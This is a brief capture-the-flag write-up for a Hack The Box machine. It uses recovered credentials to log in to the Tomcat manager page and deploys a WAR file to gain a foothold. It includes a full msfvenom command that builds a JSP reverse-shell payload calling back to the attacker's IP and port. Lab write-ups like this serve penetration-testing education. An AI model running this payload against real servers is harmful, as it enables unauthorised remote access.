# 15 - Tomcat

# manager/html is the default admin page

![](vx_images/1546520578738.png)

Let's provide  the credentials we got from backup file see 10 - Kotarak.md
![](vx_images/4803867479278.png)


# Preparing our reverse shell

```bash
┌──(kali㉿kali)-[10.10.14.9/23]-[~/htb/kotarak/gobuster]
└─$ msfvenom -p java/jsp_shell_reverse_tcp  LHOST=10.10.14.9 LPORT=4444 -f war  -o payload.war
Payload size: 1099 bytes
Final size of war file: 1099 bytes
Saved as: payload.war
```

Let's upload payload.war file and deploy it.
![](vx_images/5405590691680.png)


We should get a shell after we hit /payload

![](vx_images/871124296444.png)

# Initial Foothold
![](vx_images/1662653054870.png)

